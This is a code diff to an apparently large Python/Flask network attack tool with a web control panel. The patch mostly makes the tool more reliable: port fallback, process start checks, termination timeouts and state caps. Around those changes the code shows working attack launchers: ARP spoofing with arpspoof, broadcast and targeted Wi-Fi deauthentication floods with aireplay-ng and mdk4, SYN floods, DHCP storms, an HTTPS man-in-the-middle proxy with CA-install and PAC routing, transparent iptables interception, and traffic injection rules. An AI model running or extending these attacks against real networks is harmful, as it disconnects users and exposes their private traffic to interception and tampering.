@@ -1337,11 +1337,17 @@ class HTTPSInterceptProxy:
                 return
 
             # Connect to upstream server
+            upstream_socket = None
             try:
                 upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 upstream_socket.settimeout(10)
                 upstream_socket.connect((hostname, 443))
             except socket.error as e:
+                if upstream_socket:
+                    try:
+                        upstream_socket.close()
+                    except:
+                        pass
                 add_log('error', f'Failed to connect to {hostname}:443 - {e}')
                 return
 
@@ -1353,6 +1359,11 @@ class HTTPSInterceptProxy:
             try:
                 upstream_tls = upstream_context.wrap_socket(upstream_socket, server_hostname=hostname)
             except ssl.SSLError as e:
+                if upstream_socket:
+                    try:
+                        upstream_socket.close()
+                    except:
+                        pass
                 add_log('error', f'Upstream TLS failed for {hostname}:443: {type(e).__name__}: {e}')
                 return
 
@@ -1571,7 +1582,24 @@ class HTTPSInterceptProxy:
         try:
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server_socket.bind(('0.0.0.0', self.listen_port))
+
+            # Try to bind to configured port, or fallback to alternate ports if busy
+            ports_to_try = [self.listen_port, 8889, 8890, 8891, 8892]
+            bound = False
+            for port in ports_to_try:
+                try:
+                    server_socket.bind(('0.0.0.0', port))
+                    self.listen_port = port  # Update actual port
+                    bound = True
+                    break
+                except OSError as e:
+                    if port == ports_to_try[-1]:
+                        raise  # All ports failed, raise error
+                    continue  # Try next port
+
+            if not bound:
+                raise OSError(f'Could not bind to any port from {ports_to_try}')
+
             server_socket.listen(10)
             add_log('info', f'MITM proxy listening on port {self.listen_port}')
 
@@ -2056,12 +2084,14 @@ def serve_pac_file():
     """Serve PAC (Proxy Auto-Config) file for browser/device proxy settings.
 
     Browsers will fetch this file and use it to determine which traffic
-    routes through the MITM proxy (port 8888).
+    routes through the MITM proxy.
 
     Access: http://pac.installCA.lan/pac or http://<device-ip>:5000/pac
     """
     device_ip = request.host.split(':')[0]
-    pac_content = generate_pac_file(proxy_host=device_ip, proxy_port=8888)
+    # Use actual port that HTTPS proxy is listening on (may not be 8888 if port conflict)
+    proxy_port = HTTPS_PROXY.listen_port if HTTPS_PROXY else 8888
+    pac_content = generate_pac_file(proxy_host=device_ip, proxy_port=proxy_port)
     return Response(pac_content, mimetype='application/x-ns-proxy-autoconfig')
 
 @app.route('/ca-cert', methods=['GET'])
@@ -2940,8 +2970,8 @@ class ProcessGroup:
                 proc = subprocess.Popen(
                     cmd,
                     shell=shell,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
                     preexec_fn=os.setsid if not shell else None,  # Create process group
                     text=True
                 )
@@ -4179,23 +4209,31 @@ def start_gateway_dns():
         try:
             dnscrypt_proc = subprocess.Popen(['dnscrypt-proxy', '-config', GW_DNSCRYPT_CONF],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            time.sleep(1.5)
-            if dnscrypt_proc.poll() is not None:
-                err = dnscrypt_proc.stderr.read().decode(errors='ignore')[-400:]
+            try:
+                _, err_bytes = dnscrypt_proc.communicate(timeout=2)
+                # Process exited immediately (bad - initialization error)
+                err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
                 add_log('warning', f'dnscrypt-proxy failed to start: {err}, falling back to unbound only')
                 dnscrypt_proc = None
+            except subprocess.TimeoutExpired:
+                # Process still running after timeout (good - initialization succeeded)
+                pass
         except Exception as e:
             add_log('warning', f'Failed to start dnscrypt-proxy: {e}, falling back to unbound only')
             dnscrypt_proc = None
 
     unbound_proc = subprocess.Popen(['unbound', '-c', GW_UNBOUND_CONF, '-d'],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    time.sleep(1)
-    if unbound_proc.poll() is not None:
-        err = unbound_proc.stderr.read().decode(errors='ignore')[-400:]
+    try:
+        _, err_bytes = unbound_proc.communicate(timeout=2)
+        # Process exited immediately (bad - initialization error)
+        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
         if dnscrypt_proc:
             stop_proc('dnscrypt-proxy')
         raise RuntimeError(f'unbound failed to start: {err}')
+    except subprocess.TimeoutExpired:
+        # Process still running after timeout (good - initialization succeeded)
+        pass
 
     if dnscrypt_proc:
         add_log('success', 'Gateway DNS stack started (Unbound + DNSCrypt-proxy)')
@@ -4263,10 +4301,14 @@ def start_gateway_proxy():
     time.sleep(0.3)
     proc = subprocess.Popen(['tinyproxy', '-c', GW_TINYPROXY_CONF, '-d'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    time.sleep(1)
-    if proc.poll() is not None:
-        err = proc.stderr.read().decode(errors='ignore')[-400:]
+    try:
+        _, err_bytes = proc.communicate(timeout=2)
+        # Process exited immediately (bad - initialization error)
+        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
         raise RuntimeError(f'tinyproxy failed to start: {err}')
+    except subprocess.TimeoutExpired:
+        # Process still running after timeout (good - initialization succeeded)
+        pass
     add_log('success', f'Gateway proxy started on port {GW_PROXY_PORT}')
 
 def stop_gateway_proxy():
@@ -4403,10 +4445,14 @@ def start_ngrok_tunnel(port, authtoken=None):
     time.sleep(0.3)
     proc = subprocess.Popen(['ngrok', 'http', str(port), '--log=stdout'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    time.sleep(2)
-    if proc.poll() is not None:
-        err = proc.stderr.read().decode(errors='ignore')[-400:] if proc.stderr else ''
+    try:
+        _, err_bytes = proc.communicate(timeout=3)
+        # Process exited immediately (bad - initialization error)
+        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
         raise RuntimeError(f'ngrok failed to start: {err}')
+    except subprocess.TimeoutExpired:
+        # Process still running after timeout (good - initialization succeeded)
+        pass
     return proc
 
 def get_ngrok_public_url():
@@ -4805,24 +4851,32 @@ def start_attack_arp_freeze(targets, gateway, iface):
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            time.sleep(0.1)
-            if proc.poll() is not None:
-                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+            try:
+                _, err_bytes = proc.communicate(timeout=0.5)
+                # Process exited immediately (bad - initialization error)
+                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
                 error_msg = f'arpspoof failed for target {t}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
+            except subprocess.TimeoutExpired:
+                # Process still running after timeout (good - initialization succeeded)
+                pass
             pids.append(proc)
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            time.sleep(0.1)
-            if proc.poll() is not None:
-                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+            try:
+                _, err_bytes = proc.communicate(timeout=0.5)
+                # Process exited immediately (bad - initialization error)
+                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
                 error_msg = f'arpspoof failed for gateway {gateway}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
+            except subprocess.TimeoutExpired:
+                # Process still running after timeout (good - initialization succeeded)
+                pass
             pids.append(proc)
         return pids
     else:
@@ -4886,10 +4940,14 @@ def start_attack_arp_freeze(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
-            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
+            # Process exited immediately (bad - initialization error)
+            stderr = err_bytes.decode(errors='ignore') if err_bytes else ''
             raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
+        except subprocess.TimeoutExpired:
+            # Process still running after timeout (good - initialization succeeded)
+            pass
         # Monitor stderr from the ARP script in background
         def monitor_arp_fallback(proc_ref, path_ref):
             try:
@@ -4933,9 +4991,11 @@ def start_attack_deauth_native(targets, iface):
     with open(path, 'w') as f:
         f.write(script)
     proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-    time.sleep(0.5)
-    if proc.poll() is not None:
+    try:
+        _, err_bytes = proc.communicate(timeout=0.5)
         raise RuntimeError('Native deauth flood script exited immediately')
+    except subprocess.TimeoutExpired:
+        pass  # Process still running (good), continue
     threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
     return [proc]
 
@@ -4969,14 +5029,14 @@ def start_attack_deauth(targets, gateway, iface):
                         break
                 if t_mac:
                     cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
-                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     time.sleep(0.1)
                     if proc.poll() is not None:
                         continue
                     pids.append(proc)
         if not pids:
             cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(0.1)
             if proc.poll() is not None:
                 raise RuntimeError('aireplay-ng broadcast deauth failed')
@@ -4984,7 +5044,7 @@ def start_attack_deauth(targets, gateway, iface):
         return pids
     elif ensure_tool('mdk4'):
         cmd = ['mdk4', iface, 'd', '-c', '100']
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(0.1)
         if proc.poll() is not None:
             raise RuntimeError('mdk4 deauth failed')
@@ -5017,9 +5077,11 @@ def start_attack_deauth(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('Deauth fallback script exited immediately')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5074,9 +5136,11 @@ def start_attack_syn_flood(targets, port, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('SYN flood fallback script exited immediately')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5138,9 +5202,11 @@ def start_attack_dhcp_storm(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        time.sleep(0.5)
-        if proc.poll() is not None:
+        try:
+            _, err_bytes = proc.communicate(timeout=0.5)
             raise RuntimeError('DHCP storm fallback script exited immediately (raw socket permission likely denied)')
+        except subprocess.TimeoutExpired:
+            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5606,10 +5672,12 @@ def start_attack_monitor(targets, port, iface):
     with open(path, 'w') as f:
         f.write(script)
     try:
-        log_file = open(log_path, 'w')
+        log_file = open(log_path, 'w', buffering=1)  # Line-buffered output
     except Exception as e:
         raise RuntimeError(f'Cannot open log file {log_path}: {e}')
-    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
+    # Use DEVNULL for stderr - safest approach to avoid any file handle issues
+    # Traffic capture script writes JSON to stdout, errors go to /dev/null
+    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     time.sleep(0.5)
     if proc.poll() is not None:
         raise RuntimeError('Monitor script exited immediately')
@@ -5708,16 +5776,41 @@ def assess_attack_risk(weapon_id, targets, gateway, iface):
         )
     return ' '.join(notes) if notes else None
 
-def kill_attack(pids):
+def kill_attack(pids, timeout_per_process=1.0, max_total_timeout=10.0):
+    """Kill attack processes with aggressive timeout handling.
+
+    Args:
+        pids: List of Popen objects to terminate
+        timeout_per_process: Max seconds to wait for graceful termination per process
+        max_total_timeout: Max total seconds for entire kill operation
+    """
+    import time
+    start_time = time.time()
+
     for proc in pids:
+        # Check if we've exceeded total timeout
+        elapsed = time.time() - start_time
+        if elapsed >= max_total_timeout:
+            add_log('warn', f'Process termination timeout exceeded ({elapsed:.1f}s), forcing kill')
+            break
+
         try:
-            proc.terminate()
-            proc.wait(timeout=2)
-        except:
-            try:
-                proc.kill()
-            except:
-                pass
+            # Try graceful termination first
+            if proc.poll() is None:  # Process still running
+                proc.terminate()
+                try:
+                    # Wait with reduced timeout
+                    remaining = max(0.1, max_total_timeout - elapsed)
+                    proc.wait(timeout=min(timeout_per_process, remaining))
+                except subprocess.TimeoutExpired:
+                    # Graceful termination timed out, use SIGKILL
+                    try:
+                        proc.kill()
+                        proc.wait(timeout=0.5)
+                    except:
+                        pass  # Give up on this process
+        except Exception as e:
+            add_log('dev', f'Error terminating process: {e}')
 
 # ---------- kick & block with verification ----------
 def arp_kick_burst(ip, gateway, iface, duration=6):
@@ -8534,11 +8627,40 @@ async function launchAttack(confirmRisk) {
     showToast('Failed: ' + res.error, 'error');
   }
 }
+let stopInProgress = false;
 async function confirmStopAttack() {
+  if (stopInProgress) {
+    showToast('Attack stop already in progress...', 'info');
+    return;
+  }
   openModal('Stop Attack', 'Stop all running attacks?', async () => {
-    const res = await apiCall('stop_attack', 'POST');
-    showToast(res.status, res.success ? 'success' : 'error');
-    pollAttackStatus();
+    try {
+      stopInProgress = true;
+      document.getElementById('stop-btn').disabled = true;
+      showToast('Stopping attacks...', 'info');
+
+      const res = await apiCall('stop_attack', 'POST');
+      if (res.success) {
+        showToast('Termination in progress (will complete in background)', 'success');
+        // Poll more frequently while stopping
+        for (let i = 0; i < 30; i++) {
+          await new Promise(r => setTimeout(r, 200));
+          await pollAttackStatus();
+          const status = await apiCall('attack_status');
+          if (!Object.values(status.attacks).some(v => v)) {
+            showToast('All attacks stopped', 'success');
+            break;
+          }
+        }
+      } else {
+        showToast(res.error || 'Failed to stop attacks', 'error');
+      }
+    } catch (e) {
+      showToast('Error: ' + e.message, 'error');
+    } finally {
+      stopInProgress = false;
+      pollAttackStatus();
+    }
   });
 }
 
@@ -9463,14 +9585,15 @@ def api_start_attack():
         if risk:
             return jsonify({'success': False, 'requires_confirmation': True,
                              'error': f'{risk} Start {weapon_names_pre[weapon]} anyway?'})
-    if weapon in STATE['attack_pids']:
-        kill_attack(STATE['attack_pids'][weapon])
-        del STATE['attack_pids'][weapon]
     try:
-        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
-        if not pids:
-            raise RuntimeError('Attack launcher returned no processes')
         with STATE_LOCK:
+            if weapon in STATE['attack_pids']:
+                kill_attack(STATE['attack_pids'][weapon])
+                del STATE['attack_pids'][weapon]
+
+            pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
+            if not pids:
+                raise RuntimeError('Attack launcher returned no processes')
             STATE['attack_pids'][weapon] = pids
             STATE['attack_status'][weapon] = 'running'
         weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
@@ -9575,29 +9698,47 @@ def api_stop_network_port_monitor():
 
 def _terminate_attacks_async(attack_pids_copy, interface_to_reset_val):
     """Terminate all attack processes asynchronously (runs in daemon thread)."""
+    import time
+    max_thread_time = 15.0  # Hard limit for entire operation
+    start_time = time.time()
+
     try:
+        # Terminate all processes with per-process and total timeouts
         for weapon, pids in attack_pids_copy.items():
+            elapsed = time.time() - start_time
+            if elapsed >= max_thread_time:
+                add_log('warn', f'Async termination timeout, skipping weapon {weapon}')
+                break
+
             add_log('dev', f'Terminating {len(pids)} process(es) for weapon {weapon}')
             try:
-                kill_attack(pids)
+                # Use aggressive timeouts: 1s per process, 12s total
+                remaining_timeout = max_thread_time - elapsed
+                kill_attack(pids, timeout_per_process=1.0, max_total_timeout=remaining_timeout)
                 add_log('dev', f'Weapon {weapon} terminated successfully')
             except Exception as e:
                 add_log('error', f'Failed to terminate weapon {weapon}: {e}')
 
-        # Reset monitor mode if needed
+        # Reset monitor mode if needed (quick operation, shouldn't timeout)
         if interface_to_reset_val:
             try:
-                set_monitor(interface_to_reset_val, False)
-                with STATE_LOCK:
-                    update_state('monitor_mode_active', False)
-                add_log('dev', f'Monitor mode reset on {interface_to_reset_val}')
+                elapsed = time.time() - start_time
+                if elapsed < max_thread_time - 1:
+                    set_monitor(interface_to_reset_val, False)
+                    with STATE_LOCK:
+                        update_state('monitor_mode_active', False)
+                    add_log('dev', f'Monitor mode reset on {interface_to_reset_val}')
             except Exception as e:
                 add_log('warn', f'Failed to reset monitor mode: {e}')
 
-        # Cleanup: clear attack state
+        # Cleanup: clear attack state (atomic under lock)
+        # Only clear the weapons we actually terminated, not any new attacks started after snapshot
         with STATE_LOCK:
-            STATE['attack_pids'] = {}
-            STATE['attack_status'] = {}
+            for weapon in attack_pids_copy.keys():
+                if weapon in STATE['attack_pids']:
+                    del STATE['attack_pids'][weapon]
+                if weapon in STATE['attack_status']:
+                    del STATE['attack_status'][weapon]
             if STATE['monitor_log_path']:
                 try:
                     os.unlink(STATE['monitor_log_path'])
@@ -9605,9 +9746,14 @@ def _terminate_attacks_async(attack_pids_copy, interface_to_reset_val):
                     pass
                 STATE['monitor_log_path'] = None
 
-        add_log('info', 'All attacks stopped and cleaned up')
+        elapsed = time.time() - start_time
+        add_log('info', f'All attacks stopped and cleaned up (took {elapsed:.1f}s)')
     except Exception as e:
         add_log('error', f'Fatal error in attack termination thread: {e}')
+        # Ensure state is cleared even on error
+        with STATE_LOCK:
+            STATE['attack_pids'] = {}
+            STATE['attack_status'] = {}
 
 @app.route('/api/stop_attack', methods=['POST'])
 @require_auth
@@ -9645,7 +9791,9 @@ def api_stop_attack():
 def api_attack_status():
     with STATE_LOCK:
         for weapon, pids in STATE['attack_pids'].items():
-            if any(p.poll() is not None for p in pids):
+            # Mark weapon as dead only if ALL processes have exited (not just one)
+            # This is critical for attacks with multiple processes (e.g., ARP Freeze has 2x processes per target)
+            if all(p.poll() is not None for p in pids) if pids else False:
                 STATE['attack_status'][weapon] = 'dead'
             else:
                 STATE['attack_status'][weapon] = 'running'
@@ -9820,6 +9968,8 @@ def api_gateway_add_lan_domain():
     with STATE_LOCK:
         if domain not in STATE['lan_domains']:
             STATE['lan_domains'].append(domain)
+            if len(STATE['lan_domains']) > 100:
+                STATE['lan_domains'] = STATE['lan_domains'][-100:]
         lan_domains = list(STATE['lan_domains'])
 
     # Regenerate gateway configs with new domains
@@ -10008,7 +10158,9 @@ def api_transparent_https_enable():
     """Enable transparent HTTPS interception."""
     data = request.json or {}
     target_ips = data.get('target_ips')  # None = all traffic
-    proxy_port = data.get('proxy_port', 8888)
+    # Use actual port from HTTPS proxy (may not be 8888 if port conflict occurred)
+    default_port = HTTPS_PROXY.listen_port if HTTPS_PROXY else 8888
+    proxy_port = data.get('proxy_port', default_port)
 
     if not TRANSPARENT_INTERCEPTOR.is_available():
         return jsonify({'success': False, 'error': 'iptables not available'}), 500
@@ -10266,6 +10418,8 @@ def api_injection_create_rule():
 
     with STATE_LOCK:
         STATE['injection_rules'].append(rule)
+        if len(STATE['injection_rules']) > 500:
+            STATE['injection_rules'] = STATE['injection_rules'][-500:]
 
     add_log('info', f'Created injection rule: {rule_id} ({rule["action_type"]})')
     return jsonify({'success': True, 'rule': rule})
